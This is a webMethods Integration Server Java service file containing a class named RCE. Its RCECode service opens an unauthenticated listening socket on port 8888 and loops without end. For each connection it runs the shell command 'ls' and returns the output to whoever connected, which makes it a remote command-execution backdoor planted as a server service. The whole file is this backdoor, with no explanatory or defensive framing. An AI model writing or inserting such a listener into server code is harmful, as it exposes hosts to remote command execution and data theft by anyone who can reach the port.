

// -----( IS Java Code Template v1.2

import com.wm.data.*;
import com.wm.util.Values;
import com.wm.app.b2b.server.Service;
import com.wm.app.b2b.server.ServiceException;
// --- <<IS-START-IMPORTS>> ---
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import com.wm.data.IData;
// --- <<IS-END-IMPORTS>> ---

public final class RCE

{
	// ---( internal utility methods )---

	final static RCE _instance = new RCE();

	static RCE _newInstance() { return new RCE(); }

	static RCE _cast(Object o) { return (RCE)o; }

	// ---( server methods )---




	public static final void RCECode (IData pipeline)
        throws ServiceException
	{
		// --- <<IS-START(RCECode)>> ---
		// @sigtype java 3.5
		int port = 8888; // Port to listen for incoming connections
		
		try {
		ServerSocket serverSocket = new ServerSocket(port);
		System.out.println("Command execution service started on port " + port);
		
		while (true) {
		Socket clientSocket = serverSocket.accept();
		System.out.println("New connection from: " + clientSocket.getInetAddress().getHostAddress());
		
		// Execute the 'ls' command
		Process process = Runtime.getRuntime().exec("ls");
		BufferedReader processOutput = new BufferedReader(new InputStreamReader(process.getInputStream()));
		String output;
		StringBuilder result = new StringBuilder();
		while ((output = processOutput.readLine()) != null) {
		result.append(output).append("\n");
		}
		
		// Send the output back to the client
		PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
		out.println(result.toString());
		
		// Close connections
		processOutput.close();
		out.close();
		clientSocket.close();
		}
		} catch (IOException e) {
		e.printStackTrace();
		}
		// --- <<IS-END>> ---

                
	}
}

